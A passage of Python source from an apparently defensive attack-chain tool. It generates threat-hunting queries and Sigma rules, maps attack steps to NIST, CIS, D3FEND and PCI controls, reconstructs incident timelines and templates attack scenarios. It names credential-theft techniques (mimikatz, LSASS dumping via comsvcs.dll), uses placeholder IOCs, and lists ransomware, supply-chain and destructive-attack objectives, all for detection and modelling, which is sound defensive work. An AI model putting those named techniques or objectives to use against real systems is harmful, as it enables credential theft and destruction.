            'authentication': 'SigninLogs | where UserPrincipalName =~ "{user}"'
        },
        'sigma': {
            'process_creation': 'title: Hunt - {title}\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    {field}: "{value}"\n  condition: selection',
            'network_connection': 'title: Hunt - {title}\nlogsource:\n  category: network_connection\ndetection:\n  selection:\n    DestinationIp: "{ip}"\n  condition: selection',
            'file_creation': 'title: Hunt - {title}\nlogsource:\n  category: file_event\ndetection:\n  selection:\n    TargetFilename|contains: "{path}"\n  condition: selection'
        }
    }
    
    # Hunt hypotheses templates
    HUNT_HYPOTHESES = {
        'credential_theft': {
            'hypothesis': 'Adversary is stealing credentials from LSASS memory',
            'indicators': ['lsass.exe access', 'mimikatz patterns', 'comsvcs.dll MiniDump'],
            'data_sources': ['Process Access Events', 'PowerShell Logs', 'EDR Telemetry']
        },
        'lateral_movement': {
            'hypothesis': 'Adversary is moving laterally through the network',
            'indicators': ['PsExec usage', 'WMI remote execution', 'RDP brute force'],
            'data_sources': ['Authentication Logs', 'Network Connections', 'Process Creation']
        },
        'data_exfiltration': {
            'hypothesis': 'Adversary is exfiltrating data from the network',
            'indicators': ['Large outbound transfers', 'Unusual protocols', 'Archive creation'],
            'data_sources': ['Network Flows', 'File Events', 'DLP Logs']
        },
        'persistence': {
            'hypothesis': 'Adversary has established persistence mechanisms',
            'indicators': ['Registry run keys', 'Scheduled tasks', 'Service creation'],
            'data_sources': ['Registry Events', 'Scheduled Task Logs', 'Service Events']
        }
    }
    
    def __init__(self):
        self.generated_queries: Dict[str, List] = {}
        
    def generate_queries_for_chain(self, nodes: List[Dict], 
                                   platforms: List[str] = None) -> Dict:
        """Generate hunting queries for entire chain"""
        if platforms is None:
            platforms = ['splunk', 'elastic', 'kusto']
        
        self.generated_queries = {p: [] for p in platforms}
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            node_name = node.get('name', 'Unknown')
            
            query_type = self._determine_query_type(node_type)
            params = self._extract_query_params(node)
            
            for platform in platforms:
                if platform in self.QUERY_TEMPLATES:
                    template = self.QUERY_TEMPLATES[platform].get(query_type, '')
                    if template:
                        query = self._format_query(template, params, node_name)
                        self.generated_queries[platform].append({
                            'node': node_name,
                            'type': query_type,
                            'query': query
                        })
        
        return self.generated_queries
    
    def _determine_query_type(self, node_type: str) -> str:
        """Determine query type from node type"""
        type_mapping = {
            'exploit': 'process_creation',
            'malware': 'process_creation',
            'payload': 'process_creation',
            'c2': 'network_connection',
            'exfil': 'network_connection',
            'lateral': 'network_connection',
            'persist': 'registry',
            'scheduled': 'process_creation',
            'credential': 'process_creation',
            'powershell': 'powershell',
            'script': 'powershell',
            'logon': 'authentication',
            'file': 'file_creation'
        }
        
        for key, query_type in type_mapping.items():
            if key in node_type:
                return query_type
        
        return 'process_creation'
    
    def _extract_query_params(self, node: Dict) -> Dict:
        """Extract query parameters from node"""
        return {
            'process': node.get('process', 'cmd.exe'),
            'command': node.get('command', ''),
            'ip': node.get('target_ip', '*'),
            'port': node.get('port', '*'),
            'path': node.get('file_path', ''),
            'key': node.get('registry_key', ''),
            'keyword': node.get('keyword', ''),
            'user': node.get('user', '*'),
            'title': node.get('name', 'Unknown'),
            'field': 'CommandLine',
            'value': node.get('command', '*'),
            'process_filter': f"New_Process_Name=*{node.get('process', '')}*"
        }
    
    def _format_query(self, template: str, params: Dict, node_name: str) -> str:
        """Format query template with parameters"""
        query = template
        for key, value in params.items():
            query = query.replace('{' + key + '}', str(value))
        return query
    
    def generate_hunt_playbook(self, nodes: List[Dict]) -> str:
        """Generate a complete threat hunting playbook"""
        # Determine relevant hypotheses
        node_types = [n.get('type', '').lower() for n in nodes]
        relevant_hypotheses = []
        
        for hyp_id, hypothesis in self.HUNT_HYPOTHESES.items():
            for keyword in hypothesis['indicators']:
                if any(keyword.lower() in nt for nt in node_types):
                    relevant_hypotheses.append((hyp_id, hypothesis))
                    break
        
        playbook = [
            "=" * 70,
            "THREAT HUNTING PLAYBOOK",
            "=" * 70,
            "",
            f"Target: {len(nodes)}-stage attack chain",
            f"Hypotheses Identified: {len(relevant_hypotheses)}",
            ""
        ]
        
        for hyp_id, hypothesis in relevant_hypotheses:
            playbook.extend([
                f"HUNT HYPOTHESIS: {hyp_id.upper().replace('_', ' ')}",
                "-" * 50,
                f"Hypothesis: {hypothesis['hypothesis']}",
                "",
                "Indicators to Hunt:",
                *[f"  ‚Ä¢ {ind}" for ind in hypothesis['indicators']],
                "",
                "Required Data Sources:",
                *[f"  üìä {ds}" for ds in hypothesis['data_sources']],
                ""
            ])
        
        # Add platform-specific queries
        for platform, queries in self.generated_queries.items():
            if queries:
                playbook.extend([
                    f"{platform.upper()} QUERIES",
                    "-" * 50
                ])
                for q in queries[:5]:  # First 5 queries per platform
                    playbook.append(f"\n# {q['node']} ({q['type']})")
                    playbook.append(q['query'])
                playbook.append("")
        
        return "\n".join(playbook)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# COMPLIANCE MAPPING ENGINE - Map chains to compliance frameworks
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ComplianceMappingEngine:
    """
    Map attack chains to compliance frameworks and control gaps
    """
    
    # Compliance frameworks
    FRAMEWORKS = {
        'nist_csf': {
            'name': 'NIST Cybersecurity Framework',
            'categories': {
                'identify': ['ID.AM', 'ID.BE', 'ID.GV', 'ID.RA', 'ID.RM', 'ID.SC'],
                'protect': ['PR.AC', 'PR.AT', 'PR.DS', 'PR.IP', 'PR.MA', 'PR.PT'],
                'detect': ['DE.AE', 'DE.CM', 'DE.DP'],
                'respond': ['RS.RP', 'RS.CO', 'RS.AN', 'RS.MI', 'RS.IM'],
                'recover': ['RC.RP', 'RC.IM', 'RC.CO']
            }
        },
        'mitre_defend': {
            'name': 'MITRE D3FEND',
            'categories': {
                'harden': ['D3-ACH', 'D3-AH', 'D3-BAN', 'D3-CH'],
                'detect': ['D3-DA', 'D3-NTA', 'D3-PA', 'D3-PCSV'],
                'isolate': ['D3-BI', 'D3-EI', 'D3-NI'],
                'deceive': ['D3-DE', 'D3-DUC'],
                'evict': ['D3-CE', 'D3-FC']
            }
        },
        'cis_controls': {
            'name': 'CIS Critical Security Controls',
            'categories': {
                'basic': ['CIS-1', 'CIS-2', 'CIS-3', 'CIS-4', 'CIS-5', 'CIS-6'],
                'foundational': ['CIS-7', 'CIS-8', 'CIS-9', 'CIS-10', 'CIS-11', 'CIS-12', 'CIS-13', 'CIS-14', 'CIS-15', 'CIS-16'],
                'organizational': ['CIS-17', 'CIS-18', 'CIS-19', 'CIS-20']
            }
        },
        'pci_dss': {
            'name': 'PCI DSS 4.0',
            'categories': {
                'network': ['Req-1', 'Req-2'],
                'data': ['Req-3', 'Req-4'],
                'vulnerability': ['Req-5', 'Req-6'],
                'access': ['Req-7', 'Req-8', 'Req-9'],
                'monitoring': ['Req-10', 'Req-11'],
                'policy': ['Req-12']
            }
        }
    }
    
    # Attack to control mapping
    ATTACK_CONTROL_MAP = {
        'phishing': {
            'nist_csf': ['PR.AT-1', 'DE.CM-1'],
            'cis_controls': ['CIS-17', 'CIS-7'],
            'mitre_defend': ['D3-DA']
        },
        'exploit': {
            'nist_csf': ['PR.IP-12', 'DE.CM-8'],
            'cis_controls': ['CIS-7', 'CIS-18'],
            'mitre_defend': ['D3-ACH', 'D3-PA']
        },
        'credential': {
            'nist_csf': ['PR.AC-1', 'PR.AC-7'],
            'cis_controls': ['CIS-5', 'CIS-6'],
            'mitre_defend': ['D3-CH']
        },
        'lateral': {
            'nist_csf': ['PR.AC-5', 'DE.CM-7'],
            'cis_controls': ['CIS-12', 'CIS-14'],
            'mitre_defend': ['D3-NI', 'D3-NTA']
        },
        'exfil': {
            'nist_csf': ['PR.DS-5', 'DE.CM-1'],
            'cis_controls': ['CIS-13', 'CIS-14'],
            'mitre_defend': ['D3-NTA']
        },
        'persist': {
            'nist_csf': ['DE.CM-1', 'DE.CM-3'],
            'cis_controls': ['CIS-2', 'CIS-8'],
            'mitre_defend': ['D3-PA', 'D3-PCSV']
        }
    }
    
    def __init__(self):
        self.mapping_results: Dict = {}
        
    def map_chain_to_frameworks(self, nodes: List[Dict], 
                                frameworks: List[str] = None) -> Dict:
        """Map attack chain to compliance frameworks"""
        if frameworks is None:
            frameworks = list(self.FRAMEWORKS.keys())
        
        self.mapping_results = {
            'chain_length': len(nodes),
            'frameworks': {}
        }
        
        for framework_id in frameworks:
            if framework_id not in self.FRAMEWORKS:
                continue
            
            framework = self.FRAMEWORKS[framework_id]
            controls_triggered = set()
            gaps = []
            
            for node in nodes:
                node_type = node.get('type', '').lower()
                
                for attack_type, controls in self.ATTACK_CONTROL_MAP.items():
                    if attack_type in node_type:
                        framework_controls = controls.get(framework_id, [])
                        controls_triggered.update(framework_controls)
            
            # Identify gaps (controls that should be triggered but aren't)
            all_controls = set()
            for cat_controls in framework['categories'].values():
                all_controls.update(cat_controls)
            
            coverage = len(controls_triggered) / max(len(all_controls), 1)
            
            self.mapping_results['frameworks'][framework_id] = {
                'name': framework['name'],
                'controls_triggered': list(controls_triggered),
                'control_count': len(controls_triggered),
                'total_controls': len(all_controls),
                'coverage': round(coverage, 2),
                'gaps': list(all_controls - controls_triggered)[:10]
            }
        
        return self.mapping_results
    
    def generate_compliance_report(self) -> str:
        """Generate compliance mapping report"""
        if not self.mapping_results:
            return "No mapping has been performed yet."
        
        report = [
            "=" * 70,
            "COMPLIANCE FRAMEWORK MAPPING REPORT",
            "=" * 70,
            "",
            f"Attack Chain: {self.mapping_results['chain_length']} nodes analyzed",
            ""
        ]
        
        for framework_id, data in self.mapping_results.get('frameworks', {}).items():
            coverage_bar = "‚ñà" * int(data['coverage'] * 20) + "‚ñë" * (20 - int(data['coverage'] * 20))
            
            report.extend([
                f"{data['name']}",
                "-" * 50,
                f"Coverage: {coverage_bar} {data['coverage']*100:.0f}%",
                f"Controls Triggered: {data['control_count']}/{data['total_controls']}",
                "",
                "Relevant Controls:",
                *[f"  ‚úì {ctrl}" for ctrl in data['controls_triggered'][:10]],
                "",
                "Control Gaps (Top 10):",
                *[f"  ‚ö† {gap}" for gap in data['gaps'][:10]],
                ""
            ])
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# INCIDENT TIMELINE RECONSTRUCTOR - Reconstruct attack timeline
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class IncidentTimelineReconstructor:
    """
    Reconstruct and visualize attack timeline from chain execution
    """
    
    def __init__(self):
        self.timeline_events: List[Dict] = []
        self.phases: List[Dict] = []
        
    def reconstruct_from_chain(self, nodes: List[Dict], 
                               start_time: datetime = None) -> Dict:
        """Reconstruct timeline from attack chain"""
        if start_time is None:
            start_time = datetime.now()
        
        self.timeline_events = []
        self.phases = []
        current_time = start_time
        
        # Define phase mapping
        phase_mapping = {
            'recon': 'Reconnaissance',
            'scan': 'Reconnaissance',
            'phish': 'Initial Access',
            'exploit': 'Initial Access',
            'payload': 'Execution',
            'persist': 'Persistence',
            'privesc': 'Privilege Escalation',
            'credential': 'Credential Access',
            'lateral': 'Lateral Movement',
            'c2': 'Command and Control',
            'exfil': 'Exfiltration',
            'impact': 'Impact'
        }
        
        for i, node in enumerate(nodes):
            node_type = node.get('type', '').lower()
            duration = timedelta(minutes=node.get('duration_minutes', 30))
            
            # Determine phase
            phase = 'Unknown'
            for key, phase_name in phase_mapping.items():
                if key in node_type:
                    phase = phase_name
                    break
            
            # Create timeline event
            event = {
                'event_id': i + 1,
                'timestamp': current_time.isoformat(),
                'end_timestamp': (current_time + duration).isoformat(),
                'duration_minutes': node.get('duration_minutes', 30),
                'node_name': node.get('name', f'Step {i+1}'),
                'node_type': node_type,
                'phase': phase,
                'technique_id': node.get('technique_id', ''),
                'artifacts': self._generate_artifacts(node_type),
                'iocs': self._generate_iocs(node),
                'detection_opportunity': self._get_detection_opportunity(node_type)
            }
            
            self.timeline_events.append(event)
            current_time += duration
            
            # Track phases
            if not self.phases or self.phases[-1]['name'] != phase:
                self.phases.append({
                    'name': phase,
                    'start': event['timestamp'],
                    'events': [event['event_id']]
                })
            else:
                self.phases[-1]['events'].append(event['event_id'])
        
        return {
            'total_duration_minutes': sum(e['duration_minutes'] for e in self.timeline_events),
            'start_time': start_time.isoformat(),
            'end_time': current_time.isoformat(),
            'event_count': len(self.timeline_events),
            'phase_count': len(self.phases),
            'events': self.timeline_events,
            'phases': self.phases
        }
    
    def _generate_artifacts(self, node_type: str) -> List[str]:
        """Generate expected artifacts for node type"""
        artifact_map = {
            'exploit': ['Memory dump', 'Process creation', 'Network connection'],
            'phish': ['Email headers', 'Attachment', 'User click'],
            'credential': ['LSASS access', 'Registry access', 'SAM dump'],
            'lateral': ['Authentication event', 'SMB connection', 'Remote execution'],
            'persist': ['Registry modification', 'File creation', 'Service install'],
            'c2': ['DNS query', 'HTTP beacon', 'Encrypted traffic'],
            'exfil': ['Large transfer', 'Archive creation', 'Cloud upload']
        }
        
        for key, artifacts in artifact_map.items():
            if key in node_type:
                return artifacts
        return ['Process execution']
    
    def _generate_iocs(self, node: Dict) -> List[Dict]:
        """Generate IOCs for node"""
        iocs = []
        node_type = node.get('type', '').lower()
        
        if 'c2' in node_type or 'exfil' in node_type:
            iocs.append({'type': 'domain', 'value': 'evil-c2-server.com'})
            iocs.append({'type': 'ip', 'value': '185.x.x.x'})
        
        if 'malware' in node_type or 'payload' in node_type:
            iocs.append({'type': 'hash', 'value': 'sha256:abc123...'})
            iocs.append({'type': 'file', 'value': 'malware.exe'})
        
        return iocs
    
    def _get_detection_opportunity(self, node_type: str) -> Dict:
        """Get detection opportunity for node type"""
        opportunities = {
            'exploit': {'data_source': 'EDR', 'detection': 'Exploitation attempt'},
            'credential': {'data_source': 'EDR/SIEM', 'detection': 'LSASS access'},
            'lateral': {'data_source': 'NDR/SIEM', 'detection': 'Unusual auth'},
            'c2': {'data_source': 'NDR', 'detection': 'Beacon pattern'},
            'exfil': {'data_source': 'DLP/NDR', 'detection': 'Data transfer'}
        }
        
        for key, opp in opportunities.items():
            if key in node_type:
                return opp
        return {'data_source': 'SIEM', 'detection': 'Anomaly detection'}
    
    def generate_timeline_visualization(self) -> str:
        """Generate ASCII timeline visualization"""
        if not self.timeline_events:
            return "No timeline data available."
        
        viz = [
            "=" * 80,
            "INCIDENT TIMELINE RECONSTRUCTION",
            "=" * 80,
            ""
        ]
        
        for event in self.timeline_events:
            time_str = event['timestamp'].split('T')[1][:8]
            phase_icon = self._get_phase_icon(event['phase'])
            
            viz.append(f"‚îå‚îÄ {time_str} ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê")
            viz.append(f"‚îÇ {phase_icon} [{event['phase']}] {event['node_name'][:40]:<40} ‚îÇ")
            viz.append(f"‚îÇ   Duration: {event['duration_minutes']} min | Technique: {event['technique_id'] or 'N/A':<15} ‚îÇ")
            viz.append(f"‚îÇ   Artifacts: {', '.join(event['artifacts'][:2])[:50]:<50} ‚îÇ")
            viz.append(f"‚îÇ   Detection: {event['detection_opportunity']['data_source']} - {event['detection_opportunity']['detection'][:30]} ‚îÇ")
            viz.append(f"‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò")
            viz.append("‚îÇ")
            viz.append("‚ñº")
        
        viz.append("‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó")
        viz.append("‚ïë                         END OF ATTACK CHAIN                          ‚ïë")
        viz.append("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù")
        
        return "\n".join(viz)
    
    def _get_phase_icon(self, phase: str) -> str:
        """Get icon for phase"""
        icons = {
            'Reconnaissance': 'üîç',
            'Initial Access': 'üö™',
            'Execution': '‚ö°',
            'Persistence': 'üîí',
            'Privilege Escalation': '‚¨ÜÔ∏è',
            'Credential Access': 'üîë',
            'Lateral Movement': '‚û°Ô∏è',
            'Command and Control': 'üì°',
            'Exfiltration': 'üì§',
            'Impact': 'üí•'
        }
        return icons.get(phase, '‚ùì')


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK SCENARIO BUILDER - Build complex multi-stage scenarios
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AttackScenarioBuilder:
    """
    Build and manage complex attack scenarios with multiple chains
    """
    
    # Scenario templates
    SCENARIO_TEMPLATES = {
        'ransomware': {
            'name': 'Ransomware Attack',
            'description': 'Complete ransomware attack from initial access to encryption',
            'chains': ['initial_access', 'reconnaissance', 'lateral_movement', 'encryption'],
            'objectives': ['Encrypt critical data', 'Demand ransom payment'],
            'duration_days': 7
        },
        'data_breach': {
            'name': 'Data Breach',
            'description': 'APT-style data theft operation',
            'chains': ['initial_access', 'persistence', 'discovery', 'collection', 'exfiltration'],
            'objectives': ['Identify valuable data', 'Exfiltrate without detection'],
            'duration_days': 30
        },
        'supply_chain': {
            'name': 'Supply Chain Attack',
            'description': 'Compromise software vendor to attack customers',
            'chains': ['vendor_compromise', 'code_injection', 'distribution', 'customer_exploitation'],
            'objectives': ['Compromise vendor', 'Backdoor software', 'Mass compromise'],
            'duration_days': 180
        },
        'insider_threat': {
            'name': 'Insider Threat',
            'description': 'Malicious insider stealing data',
            'chains': ['reconnaissance', 'collection', 'staging', 'exfiltration'],
            'objectives': ['Identify valuable data', 'Avoid detection', 'Exfiltrate data'],
            'duration_days': 14
        },
        'destructive': {
            'name': 'Destructive Attack',
            'description': 'Attack designed to destroy or disrupt operations',
            'chains': ['initial_access', 'propagation', 'destruction'],
            'objectives': ['Maximize damage', 'Disable recovery'],
            'duration_days': 1
        }
    }
    
    def __init__(self):
        self.scenarios: Dict[str, Dict] = {}
        self.current_scenario: Optional[str] = None
        
    def create_scenario(self, template_id: str = None, 
                       custom_name: str = None) -> Dict:
        """Create a new attack scenario"""
        import uuid
        
        scenario_id = f"SCEN-{uuid.uuid4().hex[:8].upper()}"
        
        if template_id and template_id in self.SCENARIO_TEMPLATES:
            template = self.SCENARIO_TEMPLATES[template_id]
            scenario = {
                'scenario_id': scenario_id,
                'name': template['name'],
                'description': template['description'],
                'template': template_id,
                'chains': [],
                'objectives': template['objectives'],
                'duration_days': template['duration_days'],
                'status': 'planning',
                'created_at': datetime.now().isoformat()
            }
        else:
            scenario = {
                'scenario_id': scenario_id,
                'name': custom_name or f'Custom Scenario {scenario_id}',
                'description': 'Custom attack scenario',
                'template': None,
                'chains': [],
                'objectives': [],
                'duration_days': 7,
                'status': 'planning',
                'created_at': datetime.now().isoformat()
            }
        
        self.scenarios[scenario_id] = scenario
        self.current_scenario = scenario_id
        return scenario
    
    def add_chain_to_scenario(self, scenario_id: str, chain: Dict) -> bool:
        """Add an attack chain to a scenario"""
        if scenario_id not in self.scenarios:
            return False
        
        chain_entry = {
            'chain_id': chain.get('id', f"chain_{len(self.scenarios[scenario_id]['chains'])}"),
            'name': chain.get('name', 'Unnamed Chain'),
            'nodes': chain.get('nodes', []),
            'edges': chain.get('edges', []),
            'order': len(self.scenarios[scenario_id]['chains']),
            'dependencies': chain.get('dependencies', [])
        }
        
        self.scenarios[scenario_id]['chains'].append(chain_entry)
        return True
    
    def get_scenario(self, scenario_id: str) -> Optional[Dict]:
        """Get scenario by ID"""
        return self.scenarios.get(scenario_id)
    
    def list_scenarios(self) -> List[Dict]:
        """List all scenarios"""
        return [
            {
                'scenario_id': s['scenario_id'],
                'name': s['name'],
                'chain_count': len(s['chains']),
                'status': s['status']
            }
            for s in self.scenarios.values()
        ]
    
    def export_scenario(self, scenario_id: str) -> str:
        """Export scenario as detailed document"""
        scenario = self.scenarios.get(scenario_id)
        if not scenario:
            return "Scenario not found."
        
        doc = [
            "=" * 70,
            f"ATTACK SCENARIO: {scenario['name']}",
            "=" * 70,
            "",
            f"Scenario ID: {scenario['scenario_id']}",
            f"Status: {scenario['status']}",
            f"Created: {scenario['created_at']}",
            f"Duration: {scenario['duration_days']} days",
            "",
            "DESCRIPTION",
            "-" * 50,
            scenario['description'],
            "",
            "OBJECTIVES",
            "-" * 50,
            *[f"  ‚Ä¢ {obj}" for obj in scenario['objectives']],
            "",
            "ATTACK CHAINS",
            "-" * 50
        ]
        
        for chain in scenario['chains']:
            doc.append(f"\n[{chain['order']+1}] {chain['name']}")
            doc.append(f"    Nodes: {len(chain['nodes'])}")
            if chain['dependencies']:
                doc.append(f"    Dependencies: {', '.join(chain['dependencies'])}")
            
            for node in chain['nodes'][:3]:
                doc.append(f"      ‚Ä¢ {node.get('name', 'Unknown')}")
            
            if len(chain['nodes']) > 3:
                doc.append(f"      ... and {len(chain['nodes'])-3} more nodes")
        
        return "\n".join(doc)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# EXPLOIT CHAIN METRICS CALCULATOR - Comprehensive chain metrics
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ExploitChainMetrics:
    """
    Calculate comprehensive metrics for attack chains
    """
    
    def __init__(self):
        self.metrics: Dict[str, Any] = {}
    
    def calculate_all_metrics(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Calculate all metrics for a chain"""
        self.metrics = {
            'basic': self._calculate_basic_metrics(nodes, edges),
            'complexity': self._calculate_complexity_metrics(nodes, edges),
            'risk': self._calculate_risk_metrics(nodes),
            'timing': self._calculate_timing_metrics(nodes),
